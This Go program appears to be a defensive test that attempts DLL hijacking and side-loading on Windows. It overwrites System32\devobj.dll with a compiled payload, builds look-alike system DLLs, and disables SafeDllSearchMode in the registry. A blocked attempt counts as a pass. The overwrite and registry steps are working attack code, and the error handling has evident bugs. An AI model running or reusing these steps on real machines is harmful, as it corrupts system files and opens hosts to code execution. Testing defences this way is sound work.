package main

import (
	"helpers"
	"io"
	"os"
	"os/exec"
	"strings"

	"golang.org/x/sys/windows/registry"
)

func compileDLLs(nameOfLogFile string) {
	cmd := exec.Command("go", "build", "-o", "../DLLSideLoading/mshtml.dll", "-buildmode=c-shared", "dll.go")
	cmd1 := exec.Command("go", "build", "-o", "../DLLSideLoading/comctl32.dll", "-buildmode=c-shared", "dll.go")
	cmd2 := exec.Command("go", "build", "-o", "../DLLSideLoading/crypt32.dll", "-buildmode=c-shared", "dll.go")
	cmd3 := exec.Command("go", "build", "-o", "../DLLSideLoading/wininet.dll", "-buildmode=c-shared", "dll.go")
	cmd4 := exec.Command("go", "build", "-o", "../DLLSideLoading/shlwapi.dll", "-buildmode=c-shared", "dll.go")

	cmd.Dir = "../DLLs"
	cmd1.Dir = "../DLLs"
	cmd2.Dir = "../DLLs"
	cmd3.Dir = "../DLLs"
	cmd4.Dir = "../DLLs"

	err := cmd.Run()
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
	}
	err = cmd1.Run()
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
	}
	err = cmd2.Run()
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
	}
	err = cmd3.Run()
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
	}
	err = cmd4.Run()
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
	}
}

func main() {
	var nameOfLogFile string
	if len(os.Args) == 2 {
		nameOfLogFile = os.Args[1]
	} else {
		nameOfLogFile = helpers.CreateLogFileIfItDoesNotExist("./", "DLLSideLoad", "DLLSideLoading")
	}

	helpers.WriteLog(nameOfLogFile, "Starting test: DLLSideLoading", 2, "DLLSideLoading")

	numOfCorrectTests := 0

	cmd := exec.Command("go", "build", "-o", "./paylo.dll", "-buildmode=c-shared", "../DLLs/dll.go")
	err := cmd.Run()
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
	}

	paths := os.Getenv("SystemRoot")
	listOfPaths := strings.Split(paths, string(os.PathListSeparator))

	originalDllRead, err := os.OpenFile(listOfPaths[0]+"\\System32\\devobj.dll", os.O_RDONLY, 0666)
	if err != nil {
		if err.Error() != "Acess is denied." {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
			os.Exit(2)
		} else {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
			numOfCorrectTests++
		}
	} else {
		dll, err := os.Create("./devobj.dll")
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
			os.Exit(3)
		}

		contOrgDll, err := io.ReadAll(originalDllRead)
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
			os.Exit(4)
		}

		_, err = dll.Write(contOrgDll)
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
			os.Exit(5)
		}

		paylo, err := os.OpenFile("./paylo.dll", os.O_RDONLY, 0666)
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
			os.Exit(6)
		}

		contPay, err := io.ReadAll(paylo)
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
			os.Exit(7)
		}

		originalDllWrite, err := os.OpenFile(listOfPaths[0]+"\\System32\\devobj.dll", os.O_WRONLY|os.O_TRUNC, 0666)
		if err != nil {
			if errorOutput := err.Error(); errorOutput[len(errorOutput)-17:] == "Access is denied." {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
				numOfCorrectTests++
			} else {
				os.Exit(8)
			}

		} else {
			_, err = originalDllWrite.Write(contPay)
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
				os.Exit(9)
			}
		}
	}

	compileDLLs(nameOfLogFile)

	key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, "System\\CurrentControlSet\\Control\\Session Manager", registry.WRITE)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
		numOfCorrectTests += 1
	}

	err = key.SetDWordValue("SafeDllSearchMode", 0)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, "DLLSideLoading")
		if numOfCorrectTests == 1 {
			numOfCorrectTests += 1
		}
	}

	if numOfCorrectTests == 2 {
		os.Exit(1)
	}

	helpers.WriteLog(nameOfLogFile, "Ending test: DLLSideLoading", 2, "DLLSideLoading")

	os.Exit(0)
}
